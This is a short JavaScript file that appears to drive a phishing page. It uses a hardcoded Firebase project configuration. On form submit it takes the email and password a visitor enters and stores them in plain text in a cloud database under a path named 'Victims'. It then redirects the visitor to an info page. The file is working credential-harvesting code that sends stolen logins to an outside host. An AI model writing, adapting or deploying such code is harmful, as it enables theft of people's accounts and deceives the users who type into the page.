// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
import { getDatabase,ref , push ,onValue,set,get,child } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration

const firebaseConfig = {
apiKey: "AIzaSyD87dn4Nb-FQ8eo-Mj0-4mOSYjCQns2zeA",
authDomain: "jackan-f7100.firebaseapp.com",
databaseURL: "https://jackan-f7100-default-rtdb.firebaseio.com",
projectId: "jackan-f7100",
storageBucket: "jackan-f7100.appspot.com",
messagingSenderId: "677584601589",
appId: "1:677584601589:web:76152cef2d7cf43e93e0bc"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

const database = getDatabase(app);
console.log(database);







const form = document.querySelector('.box #Email');
form.addEventListener('submit', (event) => {
event.preventDefault();
// const dbref = ref(database, 'users');

//   push(dbref, data);

    const email = form.querySelector('#email').value,
    password = form.querySelector('#pws').value;
    console.log(email , password)
const inserData = () =>{
set(ref(database , 'Victims/'+email),{
    email : email,
    pws  :password
}).then(


)


}

inserData()



form.reset()
// Send the JSON data to a server using fetch or XMLHttpRequest

changePage('/info.html');
});


function displayData(){
const dbref = ref(database)

get(child(dbref , 'Sudents')).then(snapshot =>{

let data = [];

snapshot.forEach(childSnapshot => {
data.push(childSnapshot.val())

});
getExtractData(data)
})

}

function getExtractData(data){
console.log(data)
data.forEach(userData=>{

console.log(userData)

})
}

// displayData()





function changePage(url) {
    window.location.href = url;
  }
